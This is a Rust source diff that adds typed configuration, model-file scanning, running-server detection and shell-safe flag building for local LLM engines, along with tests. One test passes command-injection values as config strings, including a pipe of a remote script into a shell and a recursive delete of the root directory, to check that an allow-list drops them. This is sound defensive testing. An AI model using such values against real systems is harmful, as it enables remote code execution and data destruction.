@@ -18,6 +18,7 @@ use crate::ignore::Ignore;
 use anyhow::Result;
 use serde::{Deserialize, Serialize};
 use std::fmt;
+use std::path::{Path, PathBuf};
 
 // ── Core types ──────────────────────────────────────────────────────────────
 
@@ -56,7 +57,13 @@ pub struct EngineStatus {
 }
 
 /// Per-engine configuration (stored in Config.engines).
-#[derive(Debug, Clone, Serialize, Deserialize)]
+///
+/// The typed fields below (context window, device, …) are the parameters the
+/// UI exposes per engine; each engine maps them to its own CLI flags.  They
+/// are separate from `extra_args` so the UI can round-trip them without
+/// parsing flag strings.  `extra_args` remains the escape hatch for anything
+/// the typed fields don't cover.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 pub struct EngineConfig {
     /// Whether this engine is enabled.
     #[serde(default = "default_true")]
@@ -80,10 +87,52 @@ pub struct EngineConfig {
     /// process (e.g. Joshua).  Matched against model names from `list_models`.
     #[serde(default)]
     pub default_model: Option<String>,
+    /// Context window override in tokens.  Engine flags: Joshua `--n-ctx`,
+    /// llama.cpp `--ctx-size`, Ollama `--num-ctx` (load-time knob).
+    #[serde(default)]
+    pub context_length: Option<u32>,
+    /// Compute backend for engines that accept one (Joshua `--device`;
+    /// `auto`, `cpu`, `metal`, `cuda`).
+    #[serde(default)]
+    pub device: Option<String>,
+    /// Huge-page strategy (Joshua `--huge-pages`; `off`, `transparent`,
+    /// `2mb`, `1gb`, `huge`).
+    #[serde(default)]
+    pub huge_pages: Option<String>,
+    /// Require the model file to be memory-mappable (Joshua `--mmap`).
+    #[serde(default)]
+    pub mmap: bool,
+    /// Optimise the mapping for a model far larger than RAM (Joshua
+    /// `--lazy-weights`).
+    #[serde(default)]
+    pub lazy_weights: bool,
+    /// Hard ceiling on tokens generated per request (Joshua
+    /// `--max-output-tokens`).
+    #[serde(default)]
+    pub max_output_tokens: Option<u32>,
+    /// Maximum concurrent generations/embeddings (Joshua
+    /// `--max-concurrency`).
+    #[serde(default)]
+    pub max_concurrency: Option<u32>,
 }
 
 fn default_true() -> bool {
     true
+}
+
+/// Validate a client-supplied [`EngineConfig`] before it is persisted.
+///
+/// The typed fields that reach a shell command line are validated here
+/// (the same spirit as the `device`/`huge_pages` allow-list in
+/// [`joshua_serve_flags`]): the port feeds `pgrep`/`pkill` regex patterns
+/// on the stop paths, and rejecting a value that cannot be a real server
+/// port keeps that safety structural instead of relying on the field's type
+/// alone.  Extend this as new shell-reaching fields are added.
+pub fn validate_engine_config(cfg: &EngineConfig) -> Result<(), String> {
+    if cfg.port == Some(0) {
+        return Err("engine port must be between 1 and 65535".to_string());
+    }
+    Ok(())
 }
 
 impl Default for EngineConfig {
@@ -96,6 +145,13 @@ impl Default for EngineConfig {
             auto_start: false,
             extra_args: Vec::new(),
             default_model: None,
+            context_length: None,
+            device: None,
+            huge_pages: None,
+            mmap: false,
+            lazy_weights: false,
+            max_output_tokens: None,
+            max_concurrency: None,
         }
     }
 }
@@ -441,8 +497,10 @@ pub trait LocalEngine: Send + Sync {
     /// Start the engine process.
     async fn start(&self, cfg: &EngineConfig) -> Result<String>;
 
-    /// Stop the engine process.
-    async fn stop(&self) -> Result<String>;
+    /// Stop the engine process.  Receives the config so engines can scope
+    /// the stop to their own server (port/endpoint) instead of killing
+    /// every matching process on the host.
+    async fn stop(&self, cfg: &EngineConfig) -> Result<String>;
 
     /// List models available to this engine.
     async fn list_models(&self, cfg: &EngineConfig) -> Result<Vec<LocalModel>>;
@@ -509,6 +567,338 @@ impl Default for EngineRegistry {
 
 // ── Service integration ─────────────────────────────────────────────────────
 
+/// Scan a directory (recursively, one level of subdirectories) for GGUF files.
+///
+/// Shared by the file-based engines (Joshua, llama.cpp) whose "local models"
+/// are GGUF files on disk; Hugging Face downloads land in per-repo
+/// subdirectories, hence the one-level recursion.
+pub fn scan_gguf_models(dir: &Path) -> Vec<PathBuf> {
+    let mut found = Vec::new();
+    let Ok(entries) = std::fs::read_dir(dir) else {
+        return found;
+    };
+    for entry in entries.flatten() {
+        let path = entry.path();
+        if path.is_dir() {
+            if let Ok(sub) = std::fs::read_dir(&path) {
+                for sub_entry in sub.flatten() {
+                    let sub_path = sub_entry.path();
+                    if sub_path.extension().is_some_and(|e| e == "gguf") {
+                        found.push(sub_path);
+                    }
+                }
+            }
+        } else if path.extension().is_some_and(|e| e == "gguf") {
+            found.push(path);
+        }
+    }
+    found.sort();
+    found
+}
+
+/// Command lines of running processes matching `pattern` (Linux only,
+/// best-effort).  Used by the file-based engines to report servers that are
+/// already running on the host — including ones started manually outside
+/// RustyClaw — so the UI can say *which models are running* rather than only
+/// what the configured endpoint answers.
+#[cfg_attr(not(target_os = "linux"), allow(unused_variables))]
+pub async fn running_server_cmdlines(pattern: &str) -> Vec<String> {
+    #[cfg(target_os = "linux")]
+    {
+        if let Ok(output) = tokio::process::Command::new("pgrep")
+            .args(["-af", pattern])
+            .output()
+            .await
+        {
+            if output.status.success() {
+                return String::from_utf8_lossy(&output.stdout)
+                    .lines()
+                    .map(str::to_string)
+                    // Exclude the pgrep process itself (its own cmdline
+                    // contains the pattern).
+                    .filter(|l| !l.contains("pgrep"))
+                    .collect();
+            }
+        }
+    }
+    Vec::new()
+}
+
+/// Parse engine-server command lines (from [`running_server_cmdlines`])
+/// into `(model_name, port)` pairs.
+///
+/// Understands `--model/-m <path>` (and `--flag=value` forms) for the model,
+/// and the given port flags (e.g. `--addr host:port` for joshua,
+/// `--port N` for llama-server).  Both the real server process and the
+/// `sh -c "nohup …"` wrapper that spawned it match the pgrep pattern, so
+/// results are deduped by model name.
+pub(crate) fn parse_server_cmdlines(
+    lines: &[String],
+    model_flags: &[&str],
+    port_flags: &[&str],
+    default_port: u16,
+) -> Vec<(String, Option<u16>)> {
+    fn clean_token(tok: &str) -> String {
+        tok.trim_matches(|c| c == '\'' || c == '"').to_string()
+    }
+
+    fn port_from(token: &str) -> Option<u16> {
+        let token = token.trim_matches(|c| c == '\'' || c == '"');
+        // "host:port" or bare "port".
+        token
+            .rsplit_once(':')
+            .map(|(_, p)| p)
+            .unwrap_or(token)
+            .parse()
+            .ok()
+    }
+
+    let mut out: Vec<(String, Option<u16>)> = Vec::new();
+    for line in lines {
+        let line = line.trim();
+        if line.is_empty() {
+            continue;
+        }
+        // The line is "<pid> <cmdline>"; drop the pid.
+        let toks: Vec<&str> = line.split_whitespace().skip(1).collect();
+        let mut model: Option<String> = None;
+        let mut port: Option<u16> = None;
+        let mut i = 0;
+        while i < toks.len() {
+            let tok = toks[i];
+            if model_flags.contains(&tok) {
+                if let Some(v) = toks.get(i + 1) {
+                    model = Some(clean_token(v));
+                    i += 2;
+                    continue;
+                }
+            }
+            if port_flags.contains(&tok) {
+                if let Some(v) = toks.get(i + 1) {
+                    port = port_from(v).or(port);
+                    i += 2;
+                    continue;
+                }
+            }
+            // --flag=value forms.
+            if let Some((flag, val)) = tok.split_once('=') {
+                if model_flags.contains(&flag) {
+                    model = Some(clean_token(val));
+                } else if port_flags.contains(&flag) {
+                    port = port_from(val).or(port);
+                }
+            }
+            i += 1;
+        }
+        if let Some(path) = model {
+            let name = Path::new(&path)
+                .file_stem()
+                .map(|s| s.to_string_lossy().to_string())
+                .unwrap_or_else(|| path.clone());
+            if !out.iter().any(|(n, _)| *n == name) {
+                out.push((name, port));
+            }
+        }
+    }
+    if out.is_empty() {
+        out
+    } else {
+        // Fill unparsed ports with the engine's default so callers can
+        // report a usable endpoint.
+        out.into_iter()
+            .map(|(n, p)| (n, p.or(Some(default_port))))
+            .collect()
+    }
+}
+
+/// CLI flags for a Joshua server derived from the typed [`EngineConfig`]
+/// parameter fields.  `extra_args` is appended by the caller, so a raw
+/// `--n-ctx`/`--device`/… in `extra_args` still wins (it comes later on the
+/// command line and Joshua's clap takes the last occurrence).
+pub fn joshua_serve_flags(cfg: &EngineConfig) -> Vec<String> {
+    let mut flags = Vec::new();
+    if let Some(ctx) = cfg.context_length {
+        flags.push("--n-ctx".into());
+        flags.push(ctx.to_string());
+    }
+    // Device and huge-pages are free-form config strings that end up in a
+    // shell command; only emit them for the values Joshua actually accepts,
+    // so a hostile config value cannot inject shell syntax.
+    if let Some(device) = &cfg.device {
+        if matches!(device.as_str(), "auto" | "cpu" | "metal" | "cuda") {
+            flags.push("--device".into());
+            flags.push(device.clone());
+        }
+    }
+    if let Some(hp) = &cfg.huge_pages {
+        if matches!(hp.as_str(), "transparent" | "2mb" | "1gb" | "huge") {
+            flags.push("--huge-pages".into());
+            flags.push(hp.clone());
+        }
+    }
+    if cfg.mmap {
+        flags.push("--mmap".into());
+    }
+    if cfg.lazy_weights {
+        flags.push("--lazy-weights".into());
+    }
+    if let Some(m) = cfg.max_output_tokens {
+        flags.push("--max-output-tokens".into());
+        flags.push(m.to_string());
+    }
+    if let Some(c) = cfg.max_concurrency {
+        flags.push("--max-concurrency".into());
+        flags.push(c.to_string());
+    }
+    flags
+}
+
+/// Result of a provider model-list fetch with the local-engine fallback:
+/// the pickable ids, which of them are currently loaded/running (for
+/// "running" markers in pickers), and the fetch error (cleared when local
+/// models were found).
+#[derive(Debug, Clone, Default, PartialEq, Eq)]
+pub struct ProviderModels {
+    /// Model ids the picker may offer for this provider (live API list
+    /// merged with the engine's on-disk/local list).
+    pub models: Vec<String>,
+    /// Models the local engine reports as loaded/running (a subset of
+    /// `models` for engine providers; empty for cloud providers).
+    pub loaded: Vec<String>,
+    /// Why the live provider fetch failed, when nothing local replaced it.
+    pub error: Option<String>,
+}
+
+/// Fetch the model list for a provider, with the local-engine fallback.
+///
+/// The live provider API list is fetched first (as
+/// [`crate::providers::fetch_models`]); for providers that are also local
+/// engines (Ollama, llama.cpp, LM Studio, exo, Joshua) the engine's own
+/// model list is merged in — for the file-based engines (Joshua, llama.cpp)
+/// that is a scan of the models directory, so it works even when the engine
+/// server is not running.  The returned error is cleared whenever local
+/// models could be listed: the whole point of the fallback is that pickers
+/// show what is available locally.
+///
+/// Used by the gateway (for remote clients) and by the TUI (which fetches
+/// beside the vault).
+pub async fn provider_models_with_local_fallback(
+    provider: &str,
+    api_key: Option<&str>,
+    base_url_override: Option<&str>,
+    engine_configs: &std::collections::HashMap<String, EngineConfig>,
+) -> ProviderModels {
+    let (mut models, mut error) =
+        match crate::providers::fetch_models(provider, api_key, base_url_override).await {
+            Ok(models) => (models, None),
+            Err(e) => (Vec::new(), Some(format!("{:#}", e))),
+        };
+
+    let registry = EngineRegistry::new();
+    let mut loaded = Vec::new();
+    if let Some(engine) = registry.get(provider) {
+        let cfg = engine_configs.get(provider).cloned().unwrap_or_default();
+        match engine.list_models(&cfg).await {
+            Ok(local) => {
+                for m in local {
+                    if !models.iter().any(|existing| existing == &m.name) {
+                        models.push(m.name.clone());
+                    }
+                    if m.loaded && !loaded.iter().any(|l| l == &m.name) {
+                        loaded.push(m.name);
+                    }
+                }
+                if !models.is_empty() {
+                    models.sort();
+                    error = None;
+                }
+            }
+            Err(e) => {
+                tracing::debug!(
+                    provider = %provider,
+                    error = %e,
+                    "Engine-local model list unavailable"
+                );
+            }
+        }
+    }
+
+    ProviderModels {
+        models,
+        loaded,
+        error,
+    }
+}
+
+/// Metadata-carrying variant of [`provider_models_with_local_fallback`]:
+/// same local-engine fallback, but returns the rich [`crate::providers::ModelInfo`]
+/// entries (pricing, context length, display name) that
+/// [`crate::providers::fetch_models_detailed`] produces.  Locally-scanned
+/// models carry only their id (the engines layer knows the names, not the
+/// pricing).
+pub async fn provider_models_detailed_with_local_fallback(
+    provider: &str,
+    api_key: Option<&str>,
+    base_url_override: Option<&str>,
+    engine_configs: &std::collections::HashMap<String, EngineConfig>,
+) -> Result<Vec<crate::providers::ModelInfo>> {
+    use crate::providers::ModelInfo;
+
+    let live = crate::providers::fetch_models_detailed(provider, api_key, base_url_override).await;
+
+    let local: Option<Vec<crate::engines::LocalModel>> = match EngineRegistry::new().get(provider) {
+        Some(engine) => {
+            let cfg = engine_configs.get(provider).cloned().unwrap_or_default();
+            match engine.list_models(&cfg).await {
+                Ok(models) => Some(models),
+                Err(e) => {
+                    tracing::debug!(
+                        provider = %provider,
+                        error = %e,
+                        "Engine-local model list unavailable"
+                    );
+                    None
+                }
+            }
+        }
+        None => None,
+    };
+
+    let local_ids: Vec<String> = local
+        .as_ref()
+        .map(|models| models.iter().map(|m| m.name.clone()).collect())
+        .unwrap_or_default();
+
+    match live {
+        Ok(mut models) => {
+            for name in local_ids {
+                if !models.iter().any(|m| m.id == name) {
+                    models.push(ModelInfo {
+                        id: name,
+                        name: None,
+                        context_length: None,
+                        pricing_prompt: None,
+                        pricing_completion: None,
+                    });
+                }
+            }
+            models.sort_by(|a, b| a.id.cmp(&b.id));
+            Ok(models)
+        }
+        Err(_e) if !local_ids.is_empty() => Ok(local_ids
+            .into_iter()
+            .map(|id| ModelInfo {
+                id,
+                name: None,
+                context_length: None,
+                pricing_prompt: None,
+                pricing_completion: None,
+            })
+            .collect()),
+        Err(e) => Err(anyhow::anyhow!("{:#}", e)),
+    }
+}
+
 /// Build `ServiceDef` entries for engines with `auto_start = true`.
 ///
 /// The caller inserts these into the `ServicesConfig` so the existing service
@@ -563,7 +953,7 @@ pub fn engine_service_defs(
 
 /// Determine the command+args to start an engine process.
 fn engine_start_command(id: &str, cfg: &EngineConfig) -> (String, Vec<String>) {
-    let mut args: Vec<String> = cfg.extra_args.clone();
+    let args: Vec<String> = cfg.extra_args.clone();
     match id {
         "ollama" => {
             let cmd = "ollama".to_string();
@@ -578,13 +968,22 @@ fn engine_start_command(id: &str, cfg: &EngineConfig) -> (String, Vec<String>) {
         }
         "llamacpp" => {
             let cmd = "llama-server".to_string();
-            if let Some(port) = cfg.port {
-                args.extend(["--port".to_string(), port.to_string()]);
-            }
+            // Built-in flags first, then extra_args last: llama-server takes
+            // the last occurrence of a repeated flag, so a hand-written
+            // `--port`/`--ctx-size` in extra_args must override the defaults.
+            // The resolved port is always emitted so the port-scoped stop can
+            // identify auto-started servers.
+            let mut a = Vec::new();
+            let port = cfg.port.unwrap_or(8080);
+            a.extend(["--port".to_string(), port.to_string()]);
             if let Some(ref models_dir) = cfg.models_dir {
-                args.extend(["--model-store".to_string(), models_dir.clone()]);
+                a.extend(["--model-store".to_string(), models_dir.clone()]);
             }
-            (cmd, args)
+            if let Some(ctx) = cfg.context_length {
+                a.extend(["--ctx-size".to_string(), ctx.to_string()]);
+            }
+            a.extend(args);
+            (cmd, a)
         }
         "joshua" => {
             let cmd = "joshua".to_string();
@@ -604,6 +1003,7 @@ fn engine_start_command(id: &str, cfg: &EngineConfig) -> (String, Vec<String>) {
                     }
                 }
             }
+            a.extend(joshua_serve_flags(cfg));
             a.extend(args);
             (cmd, a)
         }
@@ -644,6 +1044,198 @@ mod sh_quote_tests {
             .await
             .expect("script succeeds");
         assert_eq!(out, hostile);
+    }
+}
+
+#[cfg(test)]
+mod fallback_tests {
+    use super::*;
+
+    /// llama.cpp auto-start: built-in flags come first, so a hand-written
+    /// `--port`/`--ctx-size` in extra_args still wins (llama-server takes
+    /// the last occurrence of a repeated flag).
+    #[test]
+    fn llamacpp_start_command_lets_extra_args_override_builtins() {
+        let cfg = EngineConfig {
+            context_length: Some(4096),
+            extra_args: vec![
+                "--port".into(),
+                "9999".into(),
+                "--ctx-size".into(),
+                "8192".into(),
+            ],
+            ..Default::default()
+        };
+        let (cmd, args) = engine_start_command("llamacpp", &cfg);
+        assert_eq!(cmd, "llama-server");
+        // Built-ins first …
+        assert_eq!(
+            &args[0..4],
+            &[
+                "--port".to_string(),
+                "8080".to_string(),
+                "--ctx-size".to_string(),
+                "4096".to_string()
+            ]
+        );
+        // … then extra_args last, so they win.
+        assert_eq!(
+            &args[4..],
+            &[
+                "--port".to_string(),
+                "9999".to_string(),
+                "--ctx-size".to_string(),
+                "8192".to_string()
+            ]
+        );
+    }
+
+    #[test]
+    fn validate_engine_config_rejects_an_unusable_port() {
+        // Port 0 would feed the stop-path pkill/pgrep patterns with a value
+        // that can never be a real server port; it must be rejected before
+        // the config is persisted.
+        let bad = EngineConfig {
+            port: Some(0),
+            ..Default::default()
+        };
+        assert!(validate_engine_config(&bad).is_err());
+        // Unset and ordinary ports pass.
+        assert!(validate_engine_config(&EngineConfig::default()).is_ok());
+        let good = EngineConfig {
+            port: Some(8331),
+            ..Default::default()
+        };
+        assert!(validate_engine_config(&good).is_ok());
+    }
+
+    /// A local engine whose server is not running must still surface its
+    /// on-disk models through the provider-model fallback, with the fetch
+    /// error cleared (that is what lets pickers show local models).
+    #[tokio::test]
+    async fn local_engine_models_surface_when_live_fetch_fails() {
+        let dir = std::env::temp_dir().join(format!("rc-joshua-fallback-{}", std::process::id()));
+        std::fs::remove_dir_all(&dir).ignore();
+        std::fs::create_dir_all(&dir).unwrap();
+        std::fs::write(dir.join("tiny-Q4_0.gguf"), b"x").unwrap();
+
+        let mut configs = std::collections::HashMap::new();
+        configs.insert(
+            "joshua".to_string(),
+            EngineConfig {
+                models_dir: Some(dir.to_string_lossy().to_string()),
+                ..Default::default()
+            },
+        );
+
+        // The live fetch fails fast (connection refused on localhost), so
+        // the scan is the only source — and the error must be cleared.
+        let fetched = provider_models_with_local_fallback("joshua", None, None, &configs).await;
+        assert!(fetched.error.is_none(), "local models must clear the error");
+        assert!(
+            fetched.models.iter().any(|m| m == "tiny-Q4_0"),
+            "expected the scanned GGUF in {:?}",
+            fetched.models
+        );
+        // Loaded models (from host process detection, if any joshua servers
+        // happen to be running on the test host) must always be a subset of
+        // the picker list.
+        assert!(
+            fetched.loaded.iter().all(|l| fetched.models.contains(l)),
+            "loaded {:?} must be a subset of models {:?}",
+            fetched.loaded,
+            fetched.models
+        );
+
+        std::fs::remove_dir_all(&dir).ignore();
+    }
+
+    #[test]
+    fn parses_running_server_cmdlines() {
+        let lines = vec![
+            "123 /usr/bin/joshua serve --model /home/u/models/tiny-Q4_0.gguf --addr 127.0.0.1:8080".to_string(),
+            // The `sh -c "nohup …"` wrapper that spawned it also matches
+            // pgrep; the same model must not be reported twice.
+            "124 sh -c nohup joshua serve --model '/home/u/models/tiny-Q4_0.gguf' --addr 127.0.0.1:8080 &".to_string(),
+            "125 joshua serve -m /models/big-Q8_0.gguf -a 0.0.0.0:8331".to_string(),
+            "126 joshua serve --model=/models/eq-form.gguf --addr=127.0.0.1:9999".to_string(),
+        ];
+        let joshua = parse_server_cmdlines(&lines, &["--model", "-m"], &["--addr", "-a"], 8080);
+        assert_eq!(
+            joshua,
+            vec![
+                ("tiny-Q4_0".to_string(), Some(8080)),
+                ("big-Q8_0".to_string(), Some(8331)),
+                ("eq-form".to_string(), Some(9999)),
+            ]
+        );
+        // A llama-server line parses under its own port flag.
+        let llamacpp_lines =
+            vec!["127 llama-server --model /models/llm.gguf --port 8082".to_string()];
+        let llamacpp =
+            parse_server_cmdlines(&llamacpp_lines, &["--model", "-m"], &["--port"], 8080);
+        assert_eq!(llamacpp, vec![("llm".to_string(), Some(8082))]);
+    }
+
+    #[test]
+    fn running_server_parse_defaults_port() {
+        let lines = vec!["9 joshua serve --model /models/no-addr.gguf".to_string()];
+        let parsed = parse_server_cmdlines(&lines, &["--model", "-m"], &["--addr", "-a"], 8080);
+        assert_eq!(parsed, vec![("no-addr".to_string(), Some(8080))]);
+    }
+
+    #[test]
+    fn joshua_serve_flags_cover_the_typed_parameters() {
+        let cfg = EngineConfig {
+            context_length: Some(8192),
+            device: Some("cuda".into()),
+            huge_pages: Some("2mb".into()),
+            mmap: true,
+            lazy_weights: true,
+            max_output_tokens: Some(1024),
+            max_concurrency: Some(2),
+            ..Default::default()
+        };
+        assert_eq!(
+            joshua_serve_flags(&cfg),
+            vec![
+                "--n-ctx".to_string(),
+                "8192".to_string(),
+                "--device".to_string(),
+                "cuda".to_string(),
+                "--huge-pages".to_string(),
+                "2mb".to_string(),
+                "--mmap".to_string(),
+                "--lazy-weights".to_string(),
+                "--max-output-tokens".to_string(),
+                "1024".to_string(),
+                "--max-concurrency".to_string(),
+                "2".to_string(),
+            ]
+        );
+        // "off" huge pages and an unset device emit nothing.
+        let minimal = EngineConfig {
+            huge_pages: Some("off".into()),
+            ..Default::default()
+        };
+        assert_eq!(joshua_serve_flags(&minimal), Vec::<String>::new());
+    }
+
+    #[test]
+    fn joshua_serve_flags_drop_invalid_freeform_values() {
+        // device/huge_pages are free-form config strings that end up in a
+        // shell command; anything Joshua does not accept must be dropped,
+        // never interpolated.
+        let cfg = EngineConfig {
+            device: Some("cpu; curl evil.sh | sh".into()),
+            huge_pages: Some("2mb && rm -rf /".into()),
+            context_length: Some(4096),
+            ..Default::default()
+        };
+        assert_eq!(
+            joshua_serve_flags(&cfg),
+            vec!["--n-ctx".to_string(), "4096".to_string()]
+        );
     }
 }
 
